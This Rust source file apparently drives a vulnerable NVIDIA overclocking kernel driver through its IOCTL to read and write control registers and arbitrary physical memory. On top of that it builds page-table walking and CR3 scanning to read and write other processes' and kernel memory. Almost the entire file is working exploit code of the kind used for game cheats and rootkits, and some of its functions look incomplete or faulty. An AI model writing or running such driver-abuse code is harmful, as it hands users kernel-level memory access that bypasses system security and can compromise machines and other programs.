use std::{env, mem, ptr};
use std::ffi::{c_void, OsString};
use std::io::Error;
use std::os::windows::ffi::OsStringExt;

use std::path::PathBuf;
use widestring::WideCString;
use windows_sys::Win32::System::LibraryLoader::{FreeLibrary, GetModuleHandleW, LoadLibraryW};
use windows_sys::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, MAX_PATH};
use windows_sys::Win32::Storage::FileSystem::{CreateFileW, FILE_ATTRIBUTE_HIDDEN, OPEN_EXISTING};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W};

use windows_sys::Win32::System::IO::DeviceIoControl;
use windows_sys::Win32::System::Threading::{OpenProcess, QueryFullProcessImageNameW};


mod utils;

static NVDRV_IOCTL_CODE: u32 = 0x9C40A484;

#[repr(C)]
enum NVControlRegisters {
    CR0 = 0,
    CR2 = 2,
    CR3 = 3,
    CR4 = 4
}
#[repr(C)]
enum NVFunction {
    ReadCr = 0,
    WriteCr = 1,
    PhysReq = 0x26,
    PhysRead = 0x14,
    PhysWrite = 0x15
}

struct Request {
    request_id: NVFunction,
}

#[repr(C)]
struct RequestMemcpy {
    request_id: NVFunction,
    size: i32,
    dst_addr: i64,
    src_addr: i64,
    unk: [u8; 0x20],
    packet_key: [u64; 0x40 / 8],
    unk_data: [u8; 0x138 - 0x40 - 56],
}

#[repr(C)]
struct RequestPhysAddr {
    request_id: NVFunction,
    unk_0: i32,
    result_addr: i64,
    virtual_addr: i64,
    writevalue: i32,
    unk: [u8; 0x20 - 4],
    packet_key: [u64; 0x40 / 8],
    unk_data: [u8; 0x138 - 0x40 - 56],
}

#[repr(C)]
struct RequestReadCR {
    request_id: NVFunction,
    unk_0: i32,
    cr_num: i32,
    unk10: i32,
    unk14: i32,
    unk18: i32,
    result: i32,
    unk: [u8; 0x20 - 4],
    packet_key: [u64; 0x40 / 8],
    unk_data: [u8; 0x138 - 0x40 - 56],
}

#[repr(C)]
struct RequestWriteCR {
    request_id: NVFunction,
    unk_0: i32,
    cr_num: i32,
    unk10: i32,
    unk14: i32,
    unk18: i32,
    writevalue: i32,
    unk: [u8; 0x20 - 4],
    packet_key: [u64; 0x40 / 8],
    unk_data: [u8; 0x138 - 0x40 - 56],
}

struct NVDrv {
    driver_path: PathBuf,
    nvhandle: HANDLE,
    encrypt_payload: Option<unsafe extern "C" fn(*mut Request, i32, *mut c_void) -> *mut c_void>,
    target_cr3: u64,

}

impl NVDrv {

    fn new() -> Self {
        let temp_dir = env::temp_dir().join("nvoclock.sys");
        let nvoclock = unsafe { LoadLibraryW(WideCString::from_os_str(&temp_dir).unwrap().as_ptr()) };
        if nvoclock == 0 {
            panic!("{}", Error::last_os_error());
        }

        let encrypt_payload_ptr = (nvoclock as usize + 0x2130) as *mut c_void;
        let encrypt_payload: Option<unsafe extern "C" fn(*mut Request, i32, *mut c_void) -> *mut c_void> =
            unsafe { mem::transmute(encrypt_payload_ptr) };

        let nvhandle = unsafe {
            CreateFileW(
                WideCString::from_os_str("\\\\.\\NVR0Internal").unwrap().as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                ptr::null(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_HIDDEN,
                0,
            )
        };

        if nvhandle != INVALID_HANDLE_VALUE {
            println!("NVR0Internal Handle: {:?}", nvhandle);
        } else {
            panic!("Driver is not loaded!");
        }

        NVDrv {
            driver_path: temp_dir,
            encrypt_payload,
            nvhandle,
            target_cr3: 0,
        }
    }

    fn init(&self) {

    }

    fn mm_get_physical_address(&self, virtual_address: u64) -> u64 {
        let mut request = RequestPhysAddr {
            request_id: NVFunction::PhysReq,
            unk_0: 0,
            result_addr: 0,
            virtual_addr: virtual_address as i64,
            writevalue: 0,
            unk: [0; 0x20 - 4],
            packet_key: [0; 0x40 / 8],
            unk_data: [0; 0x138 - 0x40 - 56],
        };

        unsafe {
            (self.encrypt_payload.unwrap())(
                &mut request as *mut RequestPhysAddr as *mut Request,
                0x38,
                request.packet_key.as_mut_ptr() as *mut c_void,
            );

            let mut bytes_returned = 0;
            let status = DeviceIoControl(
                self.nvhandle,
                NVDRV_IOCTL_CODE,
                &mut request as *mut RequestPhysAddr as *mut c_void,
                0x138,
                &mut request as *mut RequestPhysAddr as *mut c_void,
                0x138,
                &mut bytes_returned,
                ptr::null_mut(),
            );

            if status == 0 {
                println!("Failed VTOP for virtual address: {:p}!", virtual_address as *const u64);
                return 0;
            }

            request.result_addr as u64
        }
    }

    fn read_physical_memory(&self, physical_address: u64, res: *mut c_void, size: i32) -> bool {

        let mut request = RequestMemcpy {
            request_id: NVFunction::PhysRead,
            size,
            dst_addr: res as i64,
            src_addr: physical_address as i64,
            unk: [0; 0x20],
            packet_key: [0; 0x40 / 8],
            unk_data: [0; 0x138 - 0x40 - 56],
        };

        unsafe {
            (self.encrypt_payload.unwrap())(
                &mut request as *mut RequestMemcpy as *mut Request,
                0x38,
                request.packet_key.as_mut_ptr() as *mut c_void,
            );


            let mut bytes_returned: u32 = 0;
            let status = DeviceIoControl(
                self.nvhandle,
                NVDRV_IOCTL_CODE,
                &mut request as *mut RequestMemcpy as *mut c_void,
                0x138,
                &mut request as *mut RequestMemcpy as *mut c_void,
                0x138,
                &mut bytes_returned,
                ptr::null_mut(),
            );

            status != 0
        }
    }

    fn write_physical_memory(&self, physical_address: u64, res: *mut c_void, size: i32) -> bool {
        let mut request = RequestMemcpy {
            request_id: NVFunction::PhysWrite,
            size,
            dst_addr: physical_address as i64,
            src_addr: res as i64,
            unk: [0; 0x20],
            packet_key: [0; 0x40 / 8],
            unk_data: [0; 0x138 - 0x40 - 56],
        };

        unsafe {

            (self.encrypt_payload.unwrap())(
                &mut request as *mut RequestMemcpy as *mut Request,
                0x38,
                request.packet_key.as_mut_ptr() as *mut c_void,
            );

            let mut bytes_returned = 0;
            let status = DeviceIoControl(
                self.nvhandle,
                NVDRV_IOCTL_CODE,
                &mut request as *mut RequestMemcpy as *mut c_void,
                0x138,
                &mut request as *mut RequestMemcpy as *mut c_void,
                0x138,
                &mut bytes_returned,
                ptr::null_mut(),
            );

            status != 0
        }
    }

    fn swap_read_context(&mut self, target_cr3: u64) -> bool {
        if target_cr3 == 0 {
            return false;
        }

        self.target_cr3 = target_cr3;
        true
    }


    fn get_system_cr3(&self) -> u64 {
        for i in 0..10 {
            let mut lp_buffer: u64 = 0;
            if !self.read_physical_memory(i * 0x10000, &mut lp_buffer as *mut u64 as *mut c_void, mem::size_of::<u64>() as i32) {
                continue;
            }

            for u_offset in (0..0x10000).step_by(0x1000) {
                let mut value1: u64 = 0;
                let mut value2: u64 = 0;
                let mut value3: u64 = 0;

                if !self.read_physical_memory(lp_buffer + u_offset, &mut value1 as *mut u64 as *mut c_void, mem::size_of::<u64>() as i32) {
                    continue;
                }
                if !self.read_physical_memory(lp_buffer + u_offset + 0x70, &mut value2 as *mut u64 as *mut c_void, mem::size_of::<u64>() as i32) {
                    continue;
                }
                if !self.read_physical_memory(lp_buffer + u_offset + 0xa0, &mut value3 as *mut u64 as *mut c_void, mem::size_of::<u64>() as i32) {
                    continue;
                }

                if (0x00000001000600E9 ^ (0xffffffffffff00ff & value1)) != 0 {
                    continue;
                }
                if (0xfffff80000000000 ^ (0xfffff80000000000 & value2)) != 0 {
                    continue;
                }
                if (0xffffff0000000fff & value3) != 0 {
                    continue;
                }

                return value3;
            }
        }

        0
    }

    fn translate_linear_to_physical_address(&self, virtual_address: u64) -> u64 {
        let pml4 = ((virtual_address >> 39) & 0x1FF) as u16;
        let mut pml4e: u64 = 0;
        self.read_physical_memory(
            self.target_cr3 + pml4 as u64 * mem::size_of::<u64>() as u64,
            &mut pml4e as *mut u64 as *mut c_void,
            mem::size_of::<u64>() as i32,
        );

        let directory_ptr = ((virtual_address >> 30) & 0x1FF) as u16;
        let mut pdpte: u64 = 0;
        self.read_physical_memory(
            ((pml4e & 0xFFFFFFFFFF000) + directory_ptr as u64 * mem::size_of::<u64>() as u64),
            &mut pdpte as *mut u64 as *mut c_void,
            mem::size_of::<u64>() as i32,
        );

        if (pdpte & (1 << 7)) != 0 {
            return (pdpte & 0xFFFFFC0000000) + (virtual_address & 0x3FFFFFFF);
        }

        let directory = ((virtual_address >> 21) & 0x1FF) as u16;
        let mut pde: u64 = 0;
        self.read_physical_memory(
            (pdpte & 0xFFFFFFFFFF000) + directory as u64 * mem::size_of::<u64>() as u64,
            &mut pde as *mut u64 as *mut c_void,
            mem::size_of::<u64>() as i32,
        );

        if pde == 0 {
            return 0;
        }

        if (pde & (1 << 7)) != 0 {
            return (pde & 0xFFFFFFFE00000) + (virtual_address & 0x1FFFFF);
        }

        let table = ((virtual_address >> 12) & 0x1FF) as u16;
        let mut pte: u64 = 0;
        self.read_physical_memory(
            (pde & 0xFFFFFFFFFF000) + table as u64 * mem::size_of::<u64>() as u64,
            &mut pte as *mut u64 as *mut c_void,
            mem::size_of::<u64>() as i32,
        );

        if pte == 0 {
            return 0;
        }

        (pte & 0xFFFFFFFFFF000) + (virtual_address & 0xFFF)
    }


    fn read_virtual_memory(&self, address: u64, output: *mut c_void, size: u32) -> bool {
        if address == 0 || size == 0 {
            return false;
        }

        let physical_address = self.translate_linear_to_physical_address(address);

        if physical_address == 0 {
            return false;
        }

        if !self.read_physical_memory(physical_address, output, size as i32) {
            println!("Failed ReadVirtualMemory for address: {:p}!", address as *const u64);
            return false;
        }

        true
    }

    fn write_virtual_memory(&self, address: u64, data: *mut c_void, size: u32) -> bool {
        if address == 0 || data.is_null() || size == 0 {
            return false;
        }

        let physical_address = self.translate_linear_to_physical_address(address);

        if physical_address == 0 {
            return false;
        }

        if !self.write_physical_memory(physical_address, data, size as i32) {
            println!("Failed WriteVirtualMemory for address: {:p}!", address as *const u64);
            return false;
        }

        true
    }

    fn read_cr(&self, cr: NVControlRegisters) -> u32 {
        let mut request = RequestReadCR {
            request_id: NVFunction::ReadCr,
            unk_0: 4,
            cr_num: cr as i32,
            unk10: 0,
            unk14: 0,
            unk18: 0,
            result: 0,
            unk: [0; 0x20 - 4],
            packet_key: [12868886329971960498, 13552922889676271240, 10838534925730813900,
                11819403095038824665, 16047435637536096 ,10679697536739367056, 18271467892729589711, 6472933704646412218],
            unk_data: [0; 0x138 - 0x40 - 56],
        };

        unsafe {
            (self.encrypt_payload.unwrap())(
                &mut request as *mut RequestReadCR as *mut Request,
                0x38,
                request.packet_key.as_mut_ptr() as *mut c_void,
            );

            let mut bytes_returned = 0;
            let status = DeviceIoControl(
                self.nvhandle,
                NVDRV_IOCTL_CODE,
                &mut request as *mut RequestReadCR as *mut c_void,
                0x138,
                &mut request as *mut RequestReadCR as *mut c_void,
                0x138,
                &mut bytes_returned,
                ptr::null_mut(),
            );

            if status == 0 {
                return 0;
            }

            request.result as u32
        }
    }

    fn write_cr(&self, cr: NVControlRegisters, value: u32) -> bool {
        let mut request = RequestWriteCR {
            request_id: NVFunction::WriteCr,
            cr_num: cr as i32,
            unk10: 0,
            unk14: 0,
            unk18: 0,
            writevalue: value as i32,
            unk_0: 4,
            unk: [0; 28],
            packet_key: [0; 8],
            unk_data: [0; 192],
        };

        unsafe {
            (self.encrypt_payload.unwrap())(
                &mut request as *mut RequestWriteCR as *mut Request,
                0x38,
                request.packet_key.as_mut_ptr() as *mut c_void,
            );

            let mut bytes_returned = 0;
            let status = DeviceIoControl(
                self.nvhandle,
                NVDRV_IOCTL_CODE,
                &mut request as *mut RequestWriteCR as *mut c_void,
                0x138,
                &mut request as *mut RequestWriteCR as *mut c_void,
                0x138,
                &mut bytes_returned,
                ptr::null_mut(),
            );

            status != 0
        }
    }


    fn read<T: Default>(&self, address: u64) -> T {
        let mut buffer: T = Default::default();

        if !self.read_virtual_memory(address, &mut buffer as *mut T as *mut c_void, mem::size_of::<T>() as u32) {
            return Default::default();
        }

        buffer
    }

    fn write<T>(&self, address: u64, val: T) -> bool {
        if !self.write_virtual_memory(address, &val as *const T as *mut c_void, mem::size_of::<T>() as u32) {
            return false;
        }

        true
    }

    fn get_process_cr3(&mut self, base_address: u64) -> u64 {
        if base_address == 0 {
            return 0;
        }

        let ntdll_address = unsafe {
            GetModuleHandleW(WideCString::from_os_str("ntdll.dll").unwrap().as_ptr())
        };

        if ntdll_address == 0 {
            return 0;
        }

        let current_cr3: u64 = self.read_cr(NVControlRegisters::CR3) as u64;
        if current_cr3 == 0 {
            return 0;
        }

        self.swap_read_context(current_cr3);

        let ntdll_physical_address = self.translate_linear_to_physical_address(ntdll_address as u64);

        for i in 0..0x50000000 {
            let cr3 = i << 12;

            if cr3 == current_cr3 {
                continue;
            }

            self.swap_read_context(cr3);

            let physical_address = self.translate_linear_to_physical_address(ntdll_address as u64);

            if physical_address == 0 {
                continue;
            }

            if physical_address == ntdll_physical_address {
                self.swap_read_context(cr3);

                let bytes: u8 = self.read(base_address);

                if bytes == 0x4D {
                    println!("GetProcessCR3: {:p}", cr3 as *const u64);

                    self.swap_read_context(cr3);

                    break;
                }
            }
        }

        unsafe {
            FreeLibrary(ntdll_address);
        }

        0
    }


    fn get_process_path(&self, process_name: &str) -> String {
        let h_snapshot = unsafe { CreateToolhelp32Snapshot(0x00000002, 0) };

        if h_snapshot == 0 {
            return String::new();
        }

        let mut process_entry: PROCESSENTRY32W = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..unsafe { mem::zeroed() } // Initialize the struct with zeros
        };


        if unsafe { Process32FirstW(h_snapshot, &mut process_entry) } != 0 {
            loop {
                let exe_file = OsString::from_wide(&process_entry.szExeFile[0..260]);
                if exe_file.to_string_lossy().trim_matches('\0') == process_name {
                    unsafe {
                        CloseHandle(h_snapshot);
                    }

                    let h_process = unsafe {
                        OpenProcess(0x1000, 0, process_entry.th32ProcessID)
                    };

                    if h_process != 0 {
                        let mut buffer: [u16; 260] = [0; 260];
                        let mut buffer_size: u32 = 260;

                        if unsafe {
                            QueryFullProcessImageNameW(
                                h_process,
                                0,
                                buffer.as_mut_ptr(),
                                &mut buffer_size
                            )
                        } != 0 {
                            unsafe {
                                CloseHandle(h_process);
                            }

                            let path = OsString::from_wide(&buffer[0..(buffer_size / 2) as usize]);
                            return path.to_string_lossy().into_owned();
                        }

                        unsafe {
                            CloseHandle(h_process);
                        }
                    }

                    return String::new();
                }

                if unsafe { Process32NextW(h_snapshot, &mut process_entry) } == 0 {
                    break;
                }
            }
        }

        unsafe {
            CloseHandle(h_snapshot);
        }

        String::new()
    }

    unsafe fn get_process_base(&self, process_name: &str) -> u64 {
        let process_path = self.get_process_path(process_name) + process_name;
        LoadLibraryW(WideCString::from_str(process_path).unwrap().as_ptr()) as u64
    }

}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_start() {
        let mut drv = NVDrv::new();
        println!("Drive Location: {:?}", drv.driver_path);

        let cr0 = drv.read_cr(NVControlRegisters::CR0);
        println!("CR0: {:#x}", cr0);

        let cr2 = drv.read_cr(NVControlRegisters::CR2);
        println!("CR2: {:#x}", cr2);

        let cr3 = drv.read_cr(NVControlRegisters::CR3);
        println!("CR3: {:#x}", cr3);

        let cr4 = drv.read_cr(NVControlRegisters::CR4);
        println!("CR4: {:#x}", cr4);

        unsafe {
            let process_base = drv.get_process_base("explorer.exe");
            println!("Process Base: {:#x}", process_base);

            /*
            DWORD DumpSize = 0xFFFF;
            uintptr_t Allocation = (uintptr_t)VirtualAlloc(0, DumpSize, MEM_COMMIT, PAGE_READWRITE);
            */

            /*
            let system_cr3 = drv.get_system_cr3();
            println!("System CR3: {:#x}", system_cr3);

            let process_cr3 = drv.get_process_cr3(process_base);
            println!("Process CR3: {:#x}", process_cr3);*/
        }

    }
}